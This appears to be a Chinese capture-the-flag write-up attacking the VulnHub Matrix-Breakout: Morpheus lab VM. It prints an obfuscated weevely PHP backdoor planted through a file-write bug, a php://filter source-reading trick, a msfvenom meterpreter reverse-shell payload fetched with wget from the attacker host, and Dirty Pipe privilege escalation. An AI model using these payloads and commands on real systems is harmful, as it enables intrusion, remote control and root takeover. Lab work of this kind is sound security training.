---
title: vulnhub靶场：Matrix-Breakout
author: jh2ng
cover: 'https://image.jh2ing.com/20231114115641.png'
tags:
  - vulnhub
categories:
  - 靶场
abbrlink: 3153
date: 2023-11-14 00:00:00
---

### 前言
This is the second in the Matrix-Breakout series, subtitled Morpheus:1. It’s themed as a throwback to the first Matrix movie. You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out from, which holds the key to a mystery.

Difficulty: Medium-Hard

> Download: https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova

### 信息收集
获取到ip和端口信息，使用nmap进行探测获取到的结果如下：
```shell
Nmap scan report for 192.168.73.163
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
81/tcp open  http    nginx 1.18.0
MAC Address: 00:0C:29:96:A7:B7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
访问80端口如图所示：
![20231114115641](https://image.jh2ing.com/20231114115641.png)

f12查看一下网页源码没有什么有用的信息，访问`robots.txt`文件提示：There's no white rabbit here.  Keep searching!

使用目录扫描其它文件。
```shell
gobuster dir -u http://192.168.73.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.js
```
扫描任务建立后去访问81端口，访问之后出现
![20231114145023](https://image.jh2ing.com/20231114145023.png)

最后的目录扫描结果如下：
```shell
└─$ gobuster dir -u http://192.168.73.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.js
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.73.163
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              js,php,txt,html
[+] Timeout:                 10s
===============================================================
2023/11/14 01:43:51 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 348]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.73.163/javascript/]
/robots.txt           (Status: 200) [Size: 47]
/graffiti.txt         (Status: 200) [Size: 139]
/graffiti.php         (Status: 200) [Size: 451]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1102196 / 1102805 (99.94%)
===============================================================
2023/11/14 01:53:57 Finished
===============================================================
```
### 漏洞利用
爆破一下ssh和尝试81端口的登录无果，访问`graffiti.php`和`graffiti.txt`发现在`graffiti.php`提交的内容会出现在`graffiti.txt`文件中并返回在php页面当中。
![20231114151518](https://image.jh2ing.com/20231114151518.png)
![20231114151540](https://image.jh2ing.com/20231114151540.png)

抓取数据包查看一下，简化后的数据包：
```http
POST /graffiti.php HTTP/1.1
Host: 192.168.73.163

message=1&file=graffiti.txt
```
可以看到`message`和`file`参数，`message`参数是提交的内容，`file`参数是文件名。这里有两种思路，首先页面显示内容为graffiti.txt文件的内容，如果更改`file`参数是否返回所更改的文件内容，其次是如果将`file`参数更改成一个新的php文件会是否能写入shell。
先来尝试更改`file`参数为`../../../../../etc/passwd`提交之后返回的内容如下：
```html
<h1>
<center>
Nebuchadnezzar Graffiti Wall

</center>
</h1>
<p>
Cannot open file: ../../../../../etc/passwd
```
使用php伪协议读取源码，`file`参数更改为`php://filter/convert.base64-encode/resource=graffiti.php`提交之后返回的内容如下：
```html
<h1>
<center>
Nebuchadnezzar Graffiti Wall

</center>
</h1>
<p>
PGgxPgo8Y2VudGVyPgpOZWJ1Y2hhZG5lenphciBHcmFmZml0aSBXYWxsCgo8L2NlbnRlcj4KPC9oMT4KPHA+Cjw/cGhwCgokZmlsZT0iZ3JhZmZpdGkudHh0IjsKaWYoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT0gJ1BPU1QnKSB7CiAgICBpZiAoaXNzZXQoJF9QT1NUWydmaWxlJ10pKSB7CiAgICAgICAkZmlsZT0kX1BPU1RbJ2ZpbGUnXTsKICAgIH0KICAgIGlmIChpc3NldCgkX1BPU1RbJ21lc3NhZ2UnXSkpIHsKICAgICAgICAkaGFuZGxlID0gZm9wZW4oJGZpbGUsICdhKycpIG9yIGRpZSgnQ2Fubm90IG9wZW4gZmlsZTogJyAuICRmaWxlKTsKICAgICAgICBmd3JpdGUoJGhhbmRsZSwgJF9QT1NUWydtZXNzYWdlJ10pOwoJZndyaXRlKCRoYW5kbGUsICJcbiIpOwogICAgICAgIGZjbG9zZSgkZmlsZSk7IAogICAgfQp9CgovLyBEaXNwbGF5IGZpbGUKJGhhbmRsZSA9IGZvcGVuKCRmaWxlLCJyIik7CndoaWxlICghZmVvZigkaGFuZGxlKSkgewogIGVjaG8gZmdldHMoJGhhbmRsZSk7CiAgZWNobyAiPGJyPlxuIjsKfQpmY2xvc2UoJGhhbmRsZSk7Cj8+CjxwPgpFbnRlciBtZXNzYWdlOiAKPHA+Cjxmb3JtIG1ldGhvZD0icG9zdCI+CjxsYWJlbD5NZXNzYWdlPC9sYWJlbD48ZGl2PjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJtZXNzYWdlIj48L2Rpdj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmlsZSIgdmFsdWU9ImdyYWZmaXRpLnR4dCI+CjxkaXY+PGJ1dHRvbiB0eXBlPSJzdWJtaXQiPlBvc3Q8L2J1dHRvbj48L2Rpdj4KPC9mb3JtPgpNUW89<br>
<p>
Enter message: 
<p>
<form method="post">
<label>Message</label><div><input type="text" name="message"></div>
<input type="hidden" name="file" value="graffiti.txt">
<div><button type="submit">Post</button></div>
</form>
```
使用base64解码之后的内容如下：
```shell
└─$ echo "PGgxPgo8Y2VudGVyPgpOZWJ1Y2hhZG5lenphciBHcmFmZml0aSBXYWxsCgo8L2NlbnRlcj4KPC9oMT4KPHA+Cjw/cGhwCgokZmlsZT0iZ3JhZmZpdGkudHh0IjsKaWYoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT0gJ1BPU1QnKSB7CiAgICBpZiAoaXNzZXQoJF9QT1NUWydmaWxlJ10pKSB7CiAgICAgICAkZmlsZT0kX1BPU1RbJ2ZpbGUnXTsKICAgIH0KICAgIGlmIChpc3NldCgkX1BPU1RbJ21lc3NhZ2UnXSkpIHsKICAgICAgICAkaGFuZGxlID0gZm9wZW4oJGZpbGUsICdhKycpIG9yIGRpZSgnQ2Fubm90IG9wZW4gZmlsZTogJyAuICRmaWxlKTsKICAgICAgICBmd3JpdGUoJGhhbmRsZSwgJF9QT1NUWydtZXNzYWdlJ10pOwoJZndyaXRlKCRoYW5kbGUsICJcbiIpOwogICAgICAgIGZjbG9zZSgkZmlsZSk7IAogICAgfQp9CgovLyBEaXNwbGF5IGZpbGUKJGhhbmRsZSA9IGZvcGVuKCRmaWxlLCJyIik7CndoaWxlICghZmVvZigkaGFuZGxlKSkgewogIGVjaG8gZmdldHMoJGhhbmRsZSk7CiAgZWNobyAiPGJyPlxuIjsKfQpmY2xvc2UoJGhhbmRsZSk7Cj8+CjxwPgpFbnRlciBtZXNzYWdlOiAKPHA+Cjxmb3JtIG1ldGhvZD0icG9zdCI+CjxsYWJlbD5NZXNzYWdlPC9sYWJlbD48ZGl2PjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJtZXNzYWdlIj48L2Rpdj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmlsZSIgdmFsdWU9ImdyYWZmaXRpLnR4dCI+CjxkaXY+PGJ1dHRvbiB0eXBlPSJzdWJtaXQiPlBvc3Q8L2J1dHRvbj48L2Rpdj4KPC9mb3JtPgpNUW89" | base64 -d            
<h1>
<center>
Nebuchadnezzar Graffiti Wall

</center>
</h1>
<p>
<?php

$file="graffiti.txt";
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['file'])) {
       $file=$_POST['file'];
    }
    if (isset($_POST['message'])) {
        $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file);
        fwrite($handle, $_POST['message']);
        fwrite($handle, "\n");
        fclose($file); 
    }
}

// Display file
$handle = fopen($file,"r");
while (!feof($handle)) {
  echo fgets($handle);
  echo "<br>\n";
}
fclose($handle);
?>
<p>
Enter message: 
<p>
<form method="post">
<label>Message</label><div><input type="text" name="message"></div>
<input type="hidden" name="file" value="graffiti.txt">
<div><button type="submit">Post</button></div>
</form>
MQo=                                                                                                      
```
通过源码分析发现，`$file`变量是可以控制的，而且在`fwrite`函数中没有对`$file`变量进行过滤，可以通过`$file`变量写入任意文件。使用weevely生成木马：
```shell
┌──(test㉿kali)-[~/Desktop]
└─$ weevely generate test backdoor.php
Generated 'backdoor.php' with password 'test' of 680 byte size.
                                                                                                                                         
┌──(test㉿kali)-[~/Desktop]
└─$ cat backdoor.php           
<?php
$n='Z_Zend_clean();$r=@baseZ64_encZoZdeZ(@xZ(@gzZcompress($o),$Zk));pZrint("$p$Zkh$r$kf");}';
$b='$Zj=0;($j<$c&ZZ&$i<$l);$j++,$Zi++ZZ){$o.=$tZ{$i}^$k{$j};}}reZtuZrnZ $o;}if (@pZZreg_maZtc';
$c='h("/$kh(.Z+)$kZf/"Z,@file_get_ZcontZents("phpZ://iZnputZ"),$m)==1) {@Zob_sZtart();@eZva';
$M='ZlZ(@gzuncomprZessZ(@xZ(@base6Z4Z_decode($m[1]Z),$k))Z);$o=Z@ob_geZt_contentsZ(Z);@ob';
$g='$kZZ="098f6bcd";$kh="4Z621d3Z73cZade";$kZZf="4e8326Z27b4f6";$pZ="64xZiGliK6ZTiXe5uw";fZu';
$o='nctiZon x($tZZ,$kZZ){$c=strlen(Z$k);$l=strZlenZ($t);$o=Z"";for($iZ=Z0;$ZZi<$l;){for(';
$r=str_replace('s','','scrsseate_fsunssction');
$u=str_replace('Z','',$g.$o.$b.$c.$M.$n);
$C=$r('',$u);$C();
?>
```
在页面中将生成的木马复制在输入框中，然后burp抓包将`file`参数更改为`backdoor.php`，提交之后返回的内容如下：
```http
POST /graffiti.php HTTP/1.1
Host: 192.168.73.163

message=%3C%3Fphp+%24n%3D%27Z_Zend_clean%28%29%3B%24r%3D%40baseZ64_encZoZdeZ%28%40xZ%28%40gzZcompress%28%24o%29%2C%24Zk%29%29%3BpZrint%28%22%24p%24Zkh%24r%24kf%22%29%3B%7D%27%3B+%24b%3D%27%24Zj%3D0%3B%28%24j%3C%24c%26ZZ%26%24i%3C%24l%29%3B%24j%2B%2B%2C%24Zi%2B%2BZZ%29%7B%24o.%3D%24tZ%7B%24i%7D%5E%24k%7B%24j%7D%3B%7D%7DreZtuZrnZ+%24o%3B%7Dif+%28%40pZZreg_maZtc%27%3B+%24c%3D%27h%28%22%2F%24kh%28.Z%2B%29%24kZf%2F%22Z%2C%40file_get_ZcontZents%28%22phpZ%3A%2F%2FiZnputZ%22%29%2C%24m%29%3D%3D1%29+%7B%40Zob_sZtart%28%29%3B%40eZva%27%3B+%24M%3D%27ZlZ%28%40gzuncomprZessZ%28%40xZ%28%40base6Z4Z_decode%28%24m%5B1%5DZ%29%2C%24k%29%29Z%29%3B%24o%3DZ%40ob_geZt_contentsZ%28Z%29%3B%40ob%27%3B+%24g%3D%27%24kZZ%3D%22098f6bcd%22%3B%24kh%3D%224Z621d3Z73cZade%22%3B%24kZZf%3D%224e8326Z27b4f6%22%3B%24pZ%3D%2264xZiGliK6ZTiXe5uw%22%3BfZu%27%3B+%24o%3D%27nctiZon+x%28%24tZZ%2C%24kZZ%29%7B%24c%3Dstrlen%28Z%24k%29%3B%24l%3DstrZlenZ%28%24t%29%3B%24o%3DZ%22%22%3Bfor%28%24iZ%3DZ0%3B%24ZZi%3C%24l%3B%29%7Bfor%28%27%3B+%24r%3Dstr_replace%28%27s%27%2C%27%27%2C%27scrsseate_fsunssction%27%29%3B+%24u%3Dstr_replace%28%27Z%27%2C%27%27%2C%24g.%24o.%24b.%24c.%24M.%24n%29%3B+%24C%3D%24r%28%27%27%2C%24u%29%3B%24C%28%29%3B+%3F%3E&file=backdoor.php
```
访问`http://192.168.73.163/backdoor.php`发现可以访问，上传成功，使用weevely连接木马并查看当前用户：
```shell
┌──(test㉿kali)-[~/Desktop]
└─$ weevely http://192.168.73.163/backdoor.php test

[+] weevely 4.0.1

[+] Target:     www-data@morpheus:/var/www/html
[+] Session:    /home/test/.weevely/sessions/192.168.73.163/backdoor_0.session
[+] Shell:      System shell

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### 提权
通过msf反向连接，生成payload：
```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.73.138 LPORT=9999 -f elf -o escalate.elf
```
使用python开启http服务：
```shell
python -m http.server
```
使用weevely连接木马，切换到tmp目录，在目标机器上下载payload：
```shell
wget http://192.168.73.138:8000/escalate.elf
```
设置执行选项并执行`escalate.elf`
攻击机上启动msfconsole:
```shell
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp

# 查看需要设置的参数并进行设置
show options

# 最后执行exploit
run
```
![20231115140225](https://image.jh2ing.com/20231115140225.png)
切换到主控制台使用漏洞识别模块搜索目标机器上可能存在的漏洞
```shell
search suggester
use post/multi/recon/local_exploit_suggester

# 设置已经建立的session进行扫描
set session 1
run
```
![20231115142227](https://image.jh2ing.com/20231115142227.png)
根据找到存在的漏洞进行利用：
```shell
use exploit/linux/local/cve_2022_0847_dirtypipe
```
设置好对应参数之后直接run即可，成功提权。
![20231115142709](https://image.jh2ing.com/20231115142709.png)